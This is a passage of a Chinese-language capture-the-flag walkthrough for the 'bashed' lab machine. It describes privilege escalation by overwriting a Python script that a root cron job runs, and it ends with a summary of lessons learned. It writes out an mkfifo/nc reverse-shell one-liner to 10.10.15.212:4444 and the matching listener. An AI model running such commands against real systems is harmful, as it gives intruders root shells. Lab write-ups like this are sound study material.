$ sudo -u scriptmanager bash
Phase 3

权限提升：cron 执行 Python 脚本

scriptmanager@bashed:$ ls -la /scripts/
-rw-r--r-- 1 scriptmanager scriptmanager  test.py
-rw-r--r-- 1 root          root           test.txt
判断 cron 任务 test.py 属于 scriptmanager（可编辑），但 test.txt 属于 root——说明有个 root 的 cron 任务在定期执行 test.py。
🧒 儿童版 — 改脚本等 root 来跑 root 有个定时任务，每隔一两分钟就运行 /scripts/ 目录下的 Python 脚本。test.py 是我们能编辑的。我们把里面的代码换成"开一个反弹 shell 给我"，root 下次运行时就会乖乖连回来。

替换脚本内容

scriptmanager@bashed:$ echo -e 'import os\nos.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.212 4444 >/tmp/f")' > /scripts/test.py

# 攻击机监听
$ nc -lvnp 4444
# 等待1-2分钟...
root@bashed:/#
附录

知识点总结

目录枚举要全面。

/dev/ 这种看似无害的目录名容易被忽略，但经常藏着开发工具和调试后门。

phpbash 不够稳定，拿到后立即转反弹 shell。

浏览器内的 web shell 容易超时断开，而且不支持 Tab 补全和方向键。

判断 cron 任务的线索。

看到一个文件属于用户 A，但它的输出文件属于 root，说明 root 在定期执行该脚本。用 pspy 可以进一步确认。
